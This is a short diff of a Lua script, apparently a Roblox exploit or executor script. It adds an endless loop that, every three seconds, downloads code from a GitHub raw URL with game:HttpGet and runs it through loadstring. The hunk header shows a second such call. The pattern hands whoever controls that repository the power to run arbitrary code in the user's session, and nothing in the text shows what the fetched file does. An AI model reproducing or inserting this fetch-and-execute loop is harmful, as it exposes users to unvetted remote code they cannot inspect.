@@ -96,6 +96,6 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/theplantman/amongussu
 spawn(function()
     while true do
         wait(3)
-        
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/theplantman/amongussussyimpostor/main/wtfevenisthis",true))()
     end
 end)
